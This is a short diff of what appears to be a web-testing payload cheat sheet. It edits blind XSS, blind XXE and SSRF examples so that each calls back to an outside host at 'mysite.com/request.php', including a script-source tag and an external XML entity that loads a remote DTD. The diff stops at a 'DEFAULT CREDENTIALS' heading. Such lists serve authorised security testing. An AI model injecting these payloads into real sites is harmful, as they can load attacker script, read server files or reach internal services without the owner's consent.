@@ -33,21 +33,21 @@ BLIND XSS
 
 ```
 <embed src="http://mysite.com/request.php">
-<script src="http://mysite.com/bxssrf/request.php">
+<script src="http://mysite.com/request.php">
 ```
 BLIND XXE
 
 ```
 <?xml version="1.0" ?>
 <!DOCTYPE root [
-<!ENTITY % ext SYSTEM "http://mysite.com/bxssrf/request.php"> %ext;
+<!ENTITY % ext SYSTEM "http://mysite.com/request.php"> %ext;
 ]>
 <r></r>
 ```
 SSRF
 
 ```
-GET /testssrf.php=http://mysite.com/bxssrf/request.php
+GET /testssrf.php=http://mysite.com/request.php
 
 ```
 ### DEFAULT CREDENTIALS
